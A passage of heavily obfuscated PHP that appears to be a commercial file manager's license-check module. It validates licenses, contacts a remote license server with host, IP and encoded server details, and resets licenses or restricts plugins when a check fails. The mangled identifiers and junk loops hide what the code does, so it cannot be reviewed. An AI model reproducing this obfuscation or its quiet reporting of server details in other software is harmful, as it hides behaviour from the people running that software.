unset($¾§÷Óøğ[$¾©¾Ë¤[88]][$¾©¾Ë¤[90]][$¾©¾Ë¤[91]]); $‡½£±œ· = $ßÕ©€Ç[735]; unset($¾§÷Óøğ[$¾©¾Ë¤[88]][$¾©¾Ë¤[90]][$¾©¾Ë¤[92]]); $ÑÆ©¶ïÕ = $ßÕ©€Ç[736]; unset($¾§÷Óøğ[$¾©¾Ë¤[88]][$¾©¾Ë¤[89]][$¾©¾Ë¤[46]]); $¨¦ÊŒŒ = $ßÕ©€Ç[737]; while (strlen($¨¦ÊŒŒ) < $ßÕ©€Ç[715]) { if (!$¨¦ÊŒŒ) { break; } $¨¦ÊŒŒ++; } unset($¾§÷Óøğ[$¾©¾Ë¤[88]][$¾©¾Ë¤[89]][$¾©¾Ë¤[93]]); $Ùœ’­äİ = $ßÕ©€Ç[738]; if (strlen($Ùœ’­äİ) < $ßÕ©€Ç[711]) { return; } $¾§÷Óøğ[$¾©¾Ë¤[88]][$¾©¾Ë¤[89]][$¾©¾Ë¤[94]] = array($¾©¾Ë¤[95] => (int) $àÔ‰¥õò[$¾©¾Ë¤[96]], $¾©¾Ë¤[97] => (int) _get($àÔ‰¥õò, $¾©¾Ë¤[98], 0)); $Å¸¨–ª¥ = substr(md5($¾©¾Ë¤[99] . get_client_ip() . $åšæ×ôí[$¾©¾Ë¤[100]]), 0, 15); $¾§÷Óøğ[$¾©¾Ë¤[101]][$¾©¾Ë¤[102]] = Mcrypt::encode(Session::sign(), $Å¸¨–ª¥, 3600 * 24); $¾§÷Óøğ[$¾©¾Ë¤[101]][$¾©¾Ë¤[103]] = Action($¾©¾Ë¤[104])->accessToken(); $åæ˜×â‡ = $ßÕ©€Ç[739]; $¾§÷Óøğ[$¾©¾Ë¤[101]][$¾©¾Ë¤[105]] = md5($_SERVER[$¾©¾Ë¤[106]] . $åšæ×ôí[$¾©¾Ë¤[100]]); $¾§÷Óøğ[$¾©¾Ë¤[101]][$¾©¾Ë¤[107]] = base64_encode(serverInfo()); $æÈû“œ‡ = $ßÕ©€Ç[740]; if (!$æÈû“œ‡) { return; } $¾§÷Óøğ[$¾©¾Ë¤[101]][$¾©¾Ë¤[108]] = $this->ysfc45f101c4; if ($åšæ×ôí[$¾©¾Ë¤[108]] != $¾©¾Ë¤[109]) { $¾§÷Óøğ[$¾©¾Ë¤[101]][$¾©¾Ë¤[110]] = $åšæ×ôí[$¾©¾Ë¤[110]]; $¾§÷Óøğ[$¾©¾Ë¤[101]][$¾©¾Ë¤[111]] = $åšæ×ôí[$¾©¾Ë¤[111]]; $ö«®–¢ = rand_string(10) . $this->ysfc45f101c4 . rand_string(5); $¾§÷Óøğ[$¾©¾Ë¤[88]][$¾©¾Ë¤[112]][$¾©¾Ë¤[113]] = $this->dfyv05af7f89($ö«®–¢, $¾§÷Óøğ[$¾©¾Ë¤[101]][$¾©¾Ë¤[105]]); } if ($this->ysfc45f101c4 == $¾©¾Ë¤[109]) { $¾§÷Óøğ[$¾©¾Ë¤[88]][$¾©¾Ë¤[89]][$¾©¾Ë¤[94]][$¾©¾Ë¤[98]] = 0; } $¾§÷Óøğ[$¾©¾Ë¤[101]][$¾©¾Ë¤[114]] = $this->versionPluginFilter(); $¾§÷Óøğ[$¾©¾Ë¤[101]][$¾©¾Ë¤[115]] = _get($this->zdih62c8d9ad, $¾©¾Ë¤[116], $¾©¾Ë¤[6]); $øÃ‹Ÿˆ = $ßÕ©€Ç[741]; if (KodUser::isRoot() && $this->config[$¾©¾Ë¤[117]]) { $¾§÷Óøğ[$¾©¾Ë¤[101]][$¾©¾Ë¤[118]] = WEB_ROOT; } return $¾§÷Óøğ; } private function lhqu3c34fb59() { $ä­×ëò =& $_SERVER[¬ÏÕ§Áú]; $µëËãæò =& $_SERVER[øÍ¯û–ª]; $˜Ş»ûäÖ = $_SERVER[$µëËãæò[24]] == $µëËãæò[119]; $™à´‡ Ì = $ä­×ëò[742]; if (strlen($™à´‡ Ì) < $ä­×ëò[66]) { return; } if ($_SERVER[$µëËãæò[24]] == $µëËãæò[120] && $_GET[$µëËãæò[121]] == $µëËãæò[122]) { $˜Ş»ûäÖ = !0; } if ($˜Ş»ûäÖ) { $×¼„æ÷Œ = array($µëËãæò[108] => $this->ysfc45f101c4, $µëËãæò[123] => $this->qihdd1a5e03e(), $µëËãæò[124] => Model($µëËãæò[125])->count()); if ($this->ysfc45f101c4 != $µëËãæò[109]) { $£¢Ë®„ñ = _get($this->zdih62c8d9ad, $µëËãæò[126]); if ($£¢Ë®„ñ) { $×¼„æ÷Œ[$µëËãæò[127]] = $£¢Ë®„ñ; $×¼„æ÷Œ[$µëËãæò[128]] = strtotime(_get($this->zdih62c8d9ad, $µëËãæò[129])); $×¼„æ÷Œ[$µëËãæò[130]] = _get($this->zdih62c8d9ad, $µëËãæò[116]); } $Úí“”’¾ = Model($µëËãæò[33])->get($µëËãæò[131], $µëËãæò[6], !0); if (is_string($Úí“”’¾) && substr($Úí“”’¾, 0, 1) == $µëËãæò[132]) { $Úí“”’¾ = json_decode_force($Úí“”’¾); } if (is_array($Úí“”’¾) && $Úí“”’¾[$µëËãæò[133]] && strstr($Úí“”’¾[$µëËãæò[133]], $µëËãæò[134])) { $Õ»”ñœ = explode($µëËãæò[134], $Úí“”’¾[$µëËãæò[133]]); $×¼„æ÷Œ[$µëËãæò[135]] = $Õ»”ñœ[0]; } } $×¼„æ÷Œ = $this->oejf2a487dc6(json_encode($×¼„æ÷Œ), md5($µëËãæò[136])); $øßÂï¾ = $ä­×ëò[743]; if (!$øßÂï¾) { die; } $¸Ë³÷´ì = array($µëËãæò[137] => $×¼„æ÷Œ); call_user_func(array($µëËãæò[138], $µëËãæò[139]), $¸Ë³÷´ì); $–Ûæ –‰ = $ä­×ëò[744]; } if ($this->ysfc45f101c4 == $µëËãæò[109]) { return; } $¯ûÁ—ä¸ = array($µëËãæò[140], $µëËãæò[141], $µëËãæò[142], $µëËãæò[143], $µëËãæò[144], $µëËãæò[145]); $ô¸§ÇÖÂ = Model($µëËãæò[33])->get(); $¸Ë³÷´ì = array($µëËãæò[146] => $ô¸§ÇÖÂ[$µëËãæò[34]], $µëËãæò[147] => $ô¸§ÇÖÂ[$µëËãæò[35]], $µëËãæò[148] => $µëËãæò[6]); $ƒÓñ–Á© = $ä­×ëò[745]; foreach ($¯ûÁ—ä¸ as $¦ë–Öà†) { if (!isset($ô¸§ÇÖÂ[$¦ë–Öà†]) || !$ô¸§ÇÖÂ[$¦ë–Öà†]) { continue; } $¸Ë³÷´ì[$¦ë–Öà†] = $ô¸§ÇÖÂ[$¦ë–Öà†]; } call_user_func(array($µëËãæò[138], $µëËãæò[139]), $¸Ë³÷´ì); $€ë—³Û = $ä­×ëò[746]; while ($€ë—³Û < $ä­×ëò[715]) { if ($€ë—³Û >= 0) { break; } $€ë—³Û++; } } private function zhcu473a2995() { $ãá€ü§ =& $_SERVER[¬ÏÕ§Áú]; $¶”º¯ß¡ =& $_SERVER[øÍ¯û–ª]; if ($_SERVER[$¶”º¯ß¡[24]] != $¶”º¯ß¡[149]) { return; } if (!KodUser::isRoot()) { die; } $´î©Š×ş = $GLOBALS[$¶”º¯ß¡[13]]; if (isset($´î©Š×ş[$¶”º¯ß¡[150]])) { $this->redj432da2fd(); die; } if (isset($´î©Š×ş[$¶”º¯ß¡[151]]) && isset($´î©Š×ş[$¶”º¯ß¡[151]]) == $¶”º¯ß¡[122]) { $´î©Š×ş[$¶”º¯ß¡[152]] = Model($¶”º¯ß¡[33])->get($¶”º¯ß¡[153]); } if (!isset($´î©Š×ş[$¶”º¯ß¡[152]]) || strlen($´î©Š×ş[$¶”º¯ß¡[152]]) != 16) { show_json($¶”º¯ß¡[154] . $´î©Š×ş[$¶”º¯ß¡[152]], !1); } $ïËÕÏ¾¯ = Model($¶”º¯ß¡[33])->get($¶”º¯ß¡[100]); $•ı£Šß‚ = md5($_SERVER[$¶”º¯ß¡[106]] . $ïËÕÏ¾¯); $™Õßæ™ = $ãá€ü§[747]; while ($™Õßæ™ < $ãá€ü§[748]) { if ($™Õßæ™ >= 0) { break; } $™Õßæ™++; } $×³¸–Äü = array($¶”º¯ß¡[152] => $´î©Š×ş[$¶”º¯ß¡[152]], $¶”º¯ß¡[155] => rand_string(16), $¶”º¯ß¡[156] => $¶”º¯ß¡[136], $¶”º¯ß¡[157] => $¶”º¯ß¡[158], $¶”º¯ß¡[159] => $_SERVER[$¶”º¯ß¡[160]], $¶”º¯ß¡[161] => $_SERVER[$¶”º¯ß¡[162]], $¶”º¯ß¡[163] => $_SERVER[$¶”º¯ß¡[164]], $¶”º¯ß¡[105] => $•ı£Šß‚, $¶”º¯ß¡[165] => Model($¶”º¯ß¡[33])->get($¶”º¯ß¡[131])); if (isset($´î©Š×ş[$¶”º¯ß¡[151]]) && isset($´î©Š×ş[$¶”º¯ß¡[151]]) == $¶”º¯ß¡[122]) { $×³¸–Äü[$¶”º¯ß¡[151]] = md5($×³¸–Äü[$¶”º¯ß¡[152]] . $¶”º¯ß¡[166] . $×³¸–Äü[$¶”º¯ß¡[155]]); } if ($´î©Š×ş[$¶”º¯ß¡[167]] == $¶”º¯ß¡[168]) { $ü‘ï¾ğ = $this->oejf2a487dc6($•ı£Šß‚, $¶”º¯ß¡[169]); $Û‹‘ó = $this->dfyv05af7f89(json_encode($×³¸–Äü), $•ı£Šß‚ . $¶”º¯ß¡[170], 3); $Û‹‘ó = $Û‹‘ó . $¶”º¯ß¡[171] . $_SERVER[$¶”º¯ß¡[160]]; $Ø„­õ½ = $this->qahw0812d20a($¶”º¯ß¡[172] . $ü‘ï¾ğ . $¶”º¯ß¡[173] . $Û‹‘ó, -1); show_json($Ø„­õ½, !0); } else { if ($´î©Š×ş[$¶”º¯ß¡[167]] == $¶”º¯ß¡[174]) { $£¶†»¡– = substr(md5($¶”º¯ß¡[175] . $•ı£Šß‚), 12, 15) . $¶”º¯ß¡[176]; $Û‹‘ó = $this->vmzj3e1b7c15(trim($´î©Š×ş[$¶”º¯ß¡[177]]), $£¶†»¡–, 2); $ÄÙ™Ñ·Ó = json_decode($Û‹‘ó, !0); if (!is_array($ÄÙ™Ñ·Ó) || !is_array($ÄÙ™Ñ·Ó[$¶”º¯ß¡[178]]) || $ÄÙ™Ñ·Ó[$¶”º¯ß¡[152]] != !0) { $ß¢Ü‡Ó£ = $¶”º¯ß¡[179]; $†ğÑ´€ = $ÄÙ™Ñ·Ó[$¶”º¯ß¡[178]] ? $¶”º¯ß¡[180] . $ÄÙ™Ñ·Ó[$¶”º¯ß¡[178]] : $ß¢Ü‡Ó£; show_json($†ğÑ´€, !1); } else { $×³¸–Äü[$¶”º¯ß¡[155]] = $ÄÙ™Ñ·Ó[$¶”º¯ß¡[178]][$¶”º¯ß¡[181]]; } } else { $ÄÙ™Ñ·Ó = $this->qahw0812d20a($¶”º¯ß¡[182], $×³¸–Äü, 10); $İ‰¤¢å¦ = $ãá€ü§[747]; } } if (!is_array($ÄÙ™Ñ·Ó) || !is_array($ÄÙ™Ñ·Ó[$¶”º¯ß¡[178]]) || $ÄÙ™Ñ·Ó[$¶”º¯ß¡[152]] != !0) { $ß¢Ü‡Ó£ = LNG($¶”º¯ß¡[183]); $†ğÑ´€ = $ÄÙ™Ñ·Ó[$¶”º¯ß¡[178]] ? $¶”º¯ß¡[180] . $ÄÙ™Ñ·Ó[$¶”º¯ß¡[178]] : $ß¢Ü‡Ó£; show_json($†ğÑ´€, !1); } $Ô©ÎÇ¡Ú = $ÄÙ™Ñ·Ó[$¶”º¯ß¡[178]]; $ÈïßçÇ = $this->ybnf021878e9($Ô©ÎÇ¡Ú[$¶”º¯ß¡[184]]); $øÌÀÉï¬ = $ãá€ü§[749]; if (!$ÈïßçÇ || $ÈïßçÇ != $Ô©ÎÇ¡Ú[$¶”º¯ß¡[129]]) { $ëÒ¦ø°¯ = array($¶”º¯ß¡[185] => Model($¶”º¯ß¡[33])->get($¶”º¯ß¡[100]), $¶”º¯ß¡[186] => $_SERVER[$¶”º¯ß¡[106]], $¶”º¯ß¡[187] => this_url(), $¶”º¯ß¡[161] => $_SERVER[$¶”º¯ß¡[162]]); $Û‹‘ó = $this->qhsg0bed6bad(json_encode($ëÒ¦ø°¯)); $this->qahw0812d20a($¶”º¯ß¡[188] . $Û‹‘ó); show_json(LNG($¶”º¯ß¡[189]), !0); } $ƒ¡»é— = array($¶”º¯ß¡[153] => $Ô©ÎÇ¡Ú[$¶”º¯ß¡[190]], $¶”º¯ß¡[191] => $Ô©ÎÇ¡Ú[$¶”º¯ß¡[192]], $¶”º¯ß¡[193] => rand_string(16), $¶”º¯ß¡[108] => $Ô©ÎÇ¡Ú[$¶”º¯ß¡[194]]); if ($×³¸–Äü[$¶”º¯ß¡[155]]) { $ƒ¡»é—[$¶”º¯ß¡[193]] = $×³¸–Äü[$¶”º¯ß¡[155]]; } $÷¤“ìêœ = substr(md5($ƒ¡»é—[$¶”º¯ß¡[191]]), 10, 10); $‰íìô¼Ú = $÷¤“ìêœ . $ƒ¡»é—[$¶”º¯ß¡[108]] . $ƒ¡»é—[$¶”º¯ß¡[193]]; $ƒ¡»é—[$¶”º¯ß¡[110]] = strrev(base64_encode($this->oejf2a487dc6($‰íìô¼Ú, $¶”º¯ß¡[195]))); $¾Å„ç” = rand_string(16); $±¸´Ü‹ã = $ãá€ü§[750]; while (strlen($±¸´Ü‹ã) < $ãá€ü§[711]) { if (!$±¸´Ü‹ã) { break; } $±¸´Ü‹ã++; } $´¹·ºÀº = $¾Å„ç” . $ƒ¡»é—[$¶”º¯ß¡[108]] . $this->oejf2a487dc6(md5($ƒ¡»é—[$¶”º¯ß¡[153]]), $¾Å„ç”); $ƒ¡»é—[$¶”º¯ß¡[111]] = base64_encode(strrev($this->oejf2a487dc6($´¹·ºÀº, $¶”º¯ß¡[196]))); $›Ööñ¨Î = $ãá€ü§[751]; if ($Ô©ÎÇ¡Ú[$¶”º¯ß¡[197]] && $Ô©ÎÇ¡Ú[$¶”º¯ß¡[197]] >= 1) { Model($¶”º¯ß¡[33])->setDeep($¶”º¯ß¡[198], $¶”º¯ß¡[122]); } Model($¶”º¯ß¡[33])->set($ƒ¡»é—); $åÌƒğá = md5($_SERVER[$¶”º¯ß¡[106]] . strrev($ïËÕÏ¾¯) . $ƒ¡»é—[$¶”º¯ß¡[191]]); $›é†°„Ç = $ãá€ü§[752]; $­†’´šÙ = strrev(substr($åÌƒğá, 10, 16)); $™”öˆ’… = $ãá€ü§[753]; if (strlen($™”öˆ’…) < $ãá€ü§[748]) { return; } $¨çà¥¼ = $this->dfyv05af7f89(json_encode($Ô©ÎÇ¡Ú), $åÌƒğá); $ìœôµÔ = $ãá€ü§[754]; $Í›Œ¶« = array_to_keyvalue(Model($¶”º¯ß¡[7])->listData(), $¶”º¯ß¡[199]); $Ùƒö¥¿² = $ãá€ü§[755]; while (strlen($Ùƒö¥¿²) < $ãá€ü§[748]) { if (!$Ùƒö¥¿²) { break; } $Ùƒö¥¿²++; } $â‡ãìàâ = $Í›Œ¶«[$¶”º¯ß¡[200]]; $™‚³‰Şœ = $ãá€ü§[756]; if (strlen($™‚³‰Şœ) < $ãá€ü§[748]) { die; } $Ïö²œÄ± = array(); $¶¤™­ = $ãá€ü§[757]; if (strlen($¶¤™­) < $ãá€ü§[711]) { die; } $Ïö²œÄ±[$­†’´šÙ] = $¨çà¥¼; Model($¶”º¯ß¡[7])->update($â‡ãìàâ[$¶”º¯ß¡[201]], array($¶”º¯ß¡[202] => $Ïö²œÄ±)); $this->zdih62c8d9ad = $Ô©ÎÇ¡Ú; $this->ysfc45f101c4 = $ƒ¡»é—[$¶”º¯ß¡[108]]; $œÇÚƒ ³ = $ãá€ü§[758]; if (!$œÇÚƒ ³) { return; } $this->licenseRegistSuccess(); Cache::set($¶”º¯ß¡[203] . md5($ïËÕÏ¾¯ . $¶”º¯ß¡[204]), $¶”º¯ß¡[6]); show_json(LNG($¶”º¯ß¡[189]), !0); $™¿ê‹¬ä = $ãá€ü§[759]; if (strlen($™¿ê‹¬ä) < $ãá€ü§[720]) { die; } } private function licenseRegistSuccess() { $‰’†÷ö =& $_SERVER[øÍ¯û–ª]; $éé¢¿ç = Model($‰’†÷ö[33])->get(); $­ŒÈÍ = $_SERVER[¬ÏÕ§Áú][760]; if (!$­ŒÈÍ) { die; } if ($éé¢¿ç[$‰’†÷ö[63]] != $‰’†÷ö[122]) { Model($‰’†÷ö[33])->set($‰’†÷ö[63], $‰’†÷ö[122]); } Action($‰’†÷ö[205])->initStart(!0); } private function redj432da2fd() { $ÚÃèÜâ´ =& $_SERVER[¬ÏÕ§Áú]; $¸ÕÍ¨ø =& $_SERVER[øÍ¯û–ª]; Model($¸ÕÍ¨ø[33])->set(array($¸ÕÍ¨ø[153] => $¸ÕÍ¨ø[6], $¸ÕÍ¨ø[191] => $¸ÕÍ¨ø[6], $¸ÕÍ¨ø[108] => $¸ÕÍ¨ø[109], $¸ÕÍ¨ø[110] => $¸ÕÍ¨ø[6], $¸ÕÍ¨ø[111] => $¸ÕÍ¨ø[6])); Model($¸ÕÍ¨ø[33])->setDeep($¸ÕÍ¨ø[198], $¸ÕÍ¨ø[206]); $this->zdih62c8d9ad = array(); $§Üî­” = $ÚÃèÜâ´[761]; while (strlen($§Üî­”) < $ÚÃèÜâ´[715]) { if (!$§Üî­”) { break; } $§Üî­”++; } $this->ysfc45f101c4 = $¸ÕÍ¨ø[109]; $ÍçıøÈÂ = $ÚÃèÜâ´[762]; if (!$ÍçıøÈÂ) { die; } } private function jgic56842e91() { $ıš©ÓØÆ =& $_SERVER[¬ÏÕ§Áú]; $¢¢à¾Ú =& $_SERVER[øÍ¯û–ª]; $_SERVER[$¢¢à¾Ú[162]] = _get($_SERVER, $¢¢à¾Ú[162], APP_HOST); $this->ysfc45f101c4 = $¢¢à¾Ú[109]; $ÂµÚ†Û¨ = Model($¢¢à¾Ú[33])->get(); $Ù°Ô•Í– = $ıš©ÓØÆ[763]; if (strlen($Ù°Ô•Í–) < $ıš©ÓØÆ[711]) { return; } if ($ÂµÚ†Û¨[$¢¢à¾Ú[108]] == $¢¢à¾Ú[109]) { return; } $ÊÓÂ…È™ = Model($¢¢à¾Ú[33])->get($¢¢à¾Ú[100]); $öå“ÈÑ‹ = $ıš©ÓØÆ[764]; if (!$öå“ÈÑ‹) { die; } $Ú²µ…Æœ = $¢¢à¾Ú[203] . md5($ÊÓÂ…È™ . $¢¢à¾Ú[204]); $ç¹ùæ°‚ = $ıš©ÓØÆ[765]; $ĞÖ˜ÜÂ = Cache::get($Ú²µ…Æœ); $…Í“‘à = $ıš©ÓØÆ[766]; while (strlen($…Í“‘à) < $ıš©ÓØÆ[715]) { if (!$…Í“‘à) { break; } $…Í“‘à++; } if (!is_array($ĞÖ˜ÜÂ) || !isset($ĞÖ˜ÜÂ[$¢¢à¾Ú[207]]) || time() - $ĞÖ˜ÜÂ[$¢¢à¾Ú[207]] >= 60) { $½¢°ºÚÚ = Model($¢¢à¾Ú[7])->loadList(); $Ó¾õáÌÅ = $½¢°ºÚÚ[$¢¢à¾Ú[200]]; $û‰ØüÑº = md5($_SERVER[$¢¢à¾Ú[106]] . strrev($ÊÓÂ…È™) . $ÂµÚ†Û¨[$¢¢à¾Ú[191]]); $ÓúÁİ = strrev(substr($û‰ØüÑº, 10, 16)); $ĞÖ˜ÜÂ = $this->vmzj3e1b7c15($Ó¾õáÌÅ[$¢¢à¾Ú[86]][$ÓúÁİ], $û‰ØüÑº); $ĞÖ˜ÜÂ = json_decode($ĞÖ˜ÜÂ, !0); } if (!is_array($ĞÖ˜ÜÂ)) { return $this->redj432da2fd(); } $ÓäÛÌ¤Ô = strtotime($ĞÖ˜ÜÂ[$¢¢à¾Ú[129]]); if (time() >= $ÓäÛÌ¤Ô) { return $this->redj432da2fd(); } if (!isset($ĞÖ˜ÜÂ[$¢¢à¾Ú[207]]) || time() - $ĞÖ˜ÜÂ[$¢¢à¾Ú[207]] > 20) { $ĞÖ˜ÜÂ[$¢¢à¾Ú[207]] = time(); Cache::set($Ú²µ…Æœ, $ĞÖ˜ÜÂ); } $this->zdih62c8d9ad = $ĞÖ˜ÜÂ; $this->ysfc45f101c4 = $ÂµÚ†Û¨[$¢¢à¾Ú[108]]; } private function gsql0ef4b072() { $¨ØÖõ÷ =& $_SERVER[øÍ¯û–ª]; $ÏªõüÂŸ = $GLOBALS[$¨ØÖõ÷[13]]; $Ÿêˆá¿ = $_SERVER[$¨ØÖõ÷[24]]; if ($Ÿêˆá¿ == $¨ØÖõ÷[208] && $this->ysfc45f101c4 == $¨ØÖõ÷[109]) { show_json(LNG($¨ØÖõ÷[209]), !1, $¨ØÖõ÷[210]); } $ıÃ°ã‚ = array($¨ØÖõ÷[211], $¨ØÖõ÷[212]); if (in_array($Ÿêˆá¿, $ıÃ°ã‚)) { if ($this->ysfc45f101c4 == $¨ØÖõ÷[109] && isset($ÏªõüÂŸ[$¨ØÖõ÷[213]])) { show_json(LNG($¨ØÖõ÷[209]), !1, $¨ØÖõ÷[210]); die; } $ıÀÓûêĞ = $this->qihdd1a5e03e(); if ($ıÀÓûêĞ != intval($¨ØÖõ÷[214])) { if ($ıÀÓûêĞ <= Model($¨ØÖõ÷[125])->count()) { show_json(LNG($¨ØÖõ÷[215]), !1, $¨ØÖõ÷[210]); die; } } } } private function pgyu9d95471b() { $ÑÙèƒ½Ğ =& $_SERVER[¬ÏÕ§Áú]; $õ…õ ˆÃ =& $_SERVER[øÍ¯û–ª]; $õ©¥œŒÁ = array($õ…õ ˆÃ[119], $õ…õ ˆÃ[120]); if (!KodUser::isRoot() || !isset($_GET[$õ…õ ˆÃ[216]])) { return; } if (!in_array($_SERVER[$õ…õ ˆÃ[24]], $õ©¥œŒÁ)) { return; } $Ëîà‡ò = $õ…õ ˆÃ[217]; $Ëîà‡ò = $this->vfuh3de67cb7($Ëîà‡ò, $õ…õ ˆÃ[218]); $öñ­“Î€ = $ÑÙèƒ½Ğ[767]; $°ÀÒíæ‘ = stream_context_create(array($õ…õ ˆÃ[219] => array($õ…õ ˆÃ[220] => $õ…õ ˆÃ[221], $õ…õ ˆÃ[222] => 3))); $Ç¢üÃÜ˜ = $ÑÙèƒ½Ğ[768]; if (strlen($Ç¢üÃÜ˜) < $ÑÙèƒ½Ğ[748]) { return; } $ø¦×’†² = @file_get_contents($Ëîà‡ò, !1, $°ÀÒíæ‘); $œêéÛÓ÷ = $ÑÙèƒ½Ğ[769]; if (!$œêéÛÓ÷) { die; } header($õ…õ ˆÃ[223]); if ($ø¦×’†² && strstr($ø¦×’†², $õ…õ ˆÃ[224])) { echo $ø¦×’†²; } die; } public function jeol05612203($Ôî¬Ö¨Â) { $Ÿ—“Ã«„ =& $_SERVER[¬ÏÕ§Áú]; $Ø¨Ù¿™× =& $_SERVER[øÍ¯û–ª]; if ($this->ysfc45f101c4 == $Ø¨Ù¿™×[225]) { return $Ôî¬Ö¨Â; } $Ö‚÷æİ = $this->versionPluginList(); $Á¥Ù³´Ä = explode($Ø¨Ù¿™×[226], $this->versionPluginFilter()); $ÎàÄí = $Ÿ—“Ã«„[770]; $½ƒ“ÌäÙ = array(); $Á­û…Ê˜ = $Ÿ—“Ã«„[771]; foreach ($Ö‚÷æİ as $Ç¥×û¨ => $è•“Ø¿‡) { if ($è•“Ø¿‡ == $Ø¨Ù¿™×[227] && substr($this->ysfc45f101c4, 0, 1) == $Ø¨Ù¿™×[227]) { continue; } if (!in_array($Ç¥×û¨, $Á¥Ù³´Ä)) { $½ƒ“ÌäÙ[] = $Ç¥×û¨; } } foreach ($½ƒ“ÌäÙ as $Ç¥×û¨) { unset($Ôî¬Ö¨Â[$Ç¥×û¨]); } return $Ôî¬Ö¨Â; } private function versionPluginList() { $˜¥Â§ú =& $_SERVER[øÍ¯û–ª]; return array($˜¥Â§ú[228] => $˜¥Â§ú[227], $˜¥Â§ú[229] => $˜¥Â§ú[227], $˜¥Â§ú[230] => $˜¥Â§ú[227], $˜¥Â§ú[231] => $˜¥Â§ú[227], $˜¥Â§ú[232] => $˜¥Â§ú[233], $˜¥Â§ú[234] => $˜¥Â§ú[233], $˜¥Â§ú[235] => $˜¥Â§ú[233], $˜¥Â§ú[236] => $˜¥Â§ú[233], $˜¥Â§ú[237] => $˜¥Â§ú[233], $˜¥Â§ú[238] => $˜¥Â§ú[233], $˜¥Â§ú[239] => $˜¥Â§ú[233], $˜¥Â§ú[240] => $˜¥Â§ú[233], $˜¥Â§ú[241] => $˜¥Â§ú[233], $˜¥Â§ú[242] => $˜¥Â§ú[233], $˜¥Â§ú[243] => $˜¥Â§ú[233], $˜¥Â§ú[244] => $˜¥Â§ú[233], $˜¥Â§ú[245] => $˜¥Â§ú[233], $˜¥Â§ú[246] => $˜¥Â§ú[233]); $á¢ÑÅÀ• = $_SERVER[¬ÏÕ§Áú][772]; if (!$á¢ÑÅÀ•) { return; } } private function versionPluginFilter() { $ú²õŸ˜ç =& $_SERVER[¬ÏÕ§Áú]; $È„ŞÎª =& $_SERVER[øÍ¯û–ª]; if ($this->ysfc45f101c4 == $È„ŞÎª[109]) { return $È„ŞÎª[6]; } $ôˆ¢ğ·Ô = _get($this->zdih62c8d9ad, $È„ŞÎª[247], $È„ŞÎª[6]); $Óüõˆ = $ú²õŸ˜ç[773]; if (strlen($Óüõˆ) < $ú²õŸ˜ç[748]) { return; } $åãÂç = _get($this->zdih62c8d9ad, $È„ŞÎª[116], $È„ŞÎª[6]); $“ŸÀ”Éó = $ú²õŸ˜ç[774]; if (!$“ŸÀ”Éó) { die; } $—Ø£Ş€ = _get($this->zdih62c8d9ad, $È„ŞÎª[248], $È„ŞÎª[6]); $ö•à”İù = $ú²õŸ˜ç[775]; while (strlen($ö•à”İù) < $ú²õŸ˜ç[711]) { if (!$ö•à”İù) { break; } $ö•à”İù++; } if ($åãÂç > time() && $—Ø£Ş€ > time()) { $çª½‰òÆ = explode($È„ŞÎª[226], $ôˆ¢ğ·Ô); $éäıõÔ = array_keys($this->versionPluginList()); $ôˆ¢ğ·Ô = array_merge($çª½‰òÆ, $éäıõÔ); $ôˆ¢ğ·Ô = implode($È„ŞÎª[226], array_filter(array_unique($ôˆ¢ğ·Ô))); } return $ôˆ¢ğ·Ô; } private function nhcgba7fd8ef() { $úìÈš•™ =& $_SERVER[øÍ¯û–ª]; if ($this->ysfc45f101c4 != $úìÈš•™[109]) { $GLOBALS[$úìÈš•™[86]][$úìÈš•™[90]][$úìÈš•™[249]] = $úìÈš•™[206]; return; } $GLOBALS[$úìÈš•™[86]][$úìÈš•™[250]] = $úìÈš•™[122]; if (Model($úìÈš•™[251])->get($úìÈš•™[63]) != $úìÈš•™[206]) { Model($úìÈš•™[251])->set($úìÈš•™[63], $úìÈš•™[206]); } } public function clkv1536fb3f() { return $_SERVER[øÍ¯û–ª][252]; $ûó¹¾É = $_SERVER[¬ÏÕ§Áú][776]; } private function zxjefdd81194() { $Ó„õˆŸè =& $_SERVER[¬ÏÕ§Áú]; $¹ùÆç‘£ =& $_SERVER[øÍ¯û–ª]; $¸¬“›« = array($¹ùÆç‘£[253], $¹ùÆç‘£[254], $¹ùÆç‘£[255]); $Û«ôƒâù = $Ó„õˆŸè[777]; while (strlen($Û«ôƒâù) < $Ó„õˆŸè[66]) { if (!$Û«ôƒâù) { break; } $Û«ôƒâù++; } $Ë’¦À¶¶ = $¹ùÆç‘£[256] . md5($¹ùÆç‘£[257]); $™µ÷¨Ø = $Ó„õˆŸè[778]; if (strlen($™µ÷¨Ø) < $Ó„õˆŸè[66]) { return; } if ($this->ysfc45f101c4 == $¹ùÆç‘£[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$¹ùÆç‘£[24]], $¸¬“›«)) { return; } if (time() % 4 != 0) { return; } $Ë’€È¤… = call_user_func(array($¹ùÆç‘£[258], $¹ùÆç‘£[259]), $Ë’¦À¶¶); if ($Ë’€È¤… && time() - $Ë’€È¤… < intval($¹ùÆç‘£[260])) { return; } call_user_func(array($¹ùÆç‘£[258], $¹ùÆç‘£[139]), $Ë’¦À¶¶, time()); $â·ŠÊİğ = $Ó„õˆŸè[779]; if (strlen($â·ŠÊİğ) < $Ó„õˆŸè[748]) { die; } $’§‚¹‚ = Model($¹ùÆç‘£[33])->get($¹ùÆç‘£[100]); $Ü¢­€ˆ = $Ó„õˆŸè[780]; $ß÷–òÉã = array($¹ùÆç‘£[152] => Model($¹ùÆç‘£[33])->get($¹ùÆç‘£[153]), $¹ùÆç‘£[167] => $this->ysfc45f101c4, $¹ùÆç‘£[163] => $_SERVER[$¹ùÆç‘£[164]], $¹ùÆç‘£[165] => Model($¹ùÆç‘£[33])->get($¹ùÆç‘£[131]), $¹ùÆç‘£[105] => md5($_SERVER[$¹ùÆç‘£[106]] . $’§‚¹‚), $¹ùÆç‘£[156] => $¹ùÆç‘£[136], $¹ùÆç‘£[159] => $_SERVER[$¹ùÆç‘£[160]]); $Ğ°ş£  = $this->qahw0812d20a($¹ùÆç‘£[261], $ß÷–òÉã); $°­–À‘ö = $Ó„õˆŸè[781]; if (!$°­–À‘ö) { die; } if (!is_array($Ğ°ş£ )) { return; } if ($Ğ°ş£ [$¹ùÆç‘£[152]] && $Ğ°ş£ [$¹ùÆç‘£[262]]) { if ($this->ybnf021878e9($Ğ°ş£ [$¹ùÆç‘£[262]]) == $ß÷–òÉã[$¹ùÆç‘£[152]]) { return; } } $this->redj432da2fd(); $È®ößÍÕ = $Ó„õˆŸè[782]; if (strlen($È®ößÍÕ) < $Ó„õˆŸè[66]) { return; } if ($this->ybnf021878e9($Ğ°ş£ [$¹ùÆç‘£[262]]) != 